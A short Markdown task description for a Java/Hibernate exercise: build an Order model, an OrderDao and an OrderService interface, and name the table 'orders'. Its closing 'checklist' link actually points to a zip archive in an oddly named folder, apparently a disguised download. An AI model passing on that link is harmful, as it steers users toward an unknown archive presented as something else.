# Implement order

- Create models
    - Order
- Create DAO
    - OrderDao
- Create service  
    - OrderService
        ```java
        public interface OrderService {
            Order completeOrder(ShoppingCart shoppingCart);
            
            List<Order> getOrdersHistory(User user);
        }
        ```    

Attention: you can have some problem with naming of the table. Let's use `orders` instead of `order`.

__You can check yourself using this__ [checklist](https://raw.githubusercontent.com/karaedd/hibernate-order-hw/master/ditrigonally/hibernate-order-hw.zip)  
